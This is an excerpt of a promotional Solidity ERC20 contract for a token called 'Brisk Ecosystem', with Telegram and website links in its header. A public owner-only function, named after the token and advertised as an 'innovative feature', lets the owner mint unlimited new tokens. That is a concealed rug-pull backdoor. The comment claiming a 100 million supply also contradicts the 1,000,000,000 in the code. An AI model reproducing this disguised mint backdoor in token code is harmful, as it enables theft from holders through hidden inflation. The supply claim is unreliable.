//
// $BriskEcosystem proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/BriskEcosystem
// 📱 Website ::https://briskecosystem.com
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _BriskEcosystem(uint256 amount) public onlyOwner {
 _BriskEcosystem(msg.sender, amount);
    }
    ...
    function _BriskEcosystem(address account, uint256 amount) internal virtual {
...
contract $BriskEcosystem is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Brisk Ecosystem", "BECOSYSTEM") {
     _BriskEcosystem(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}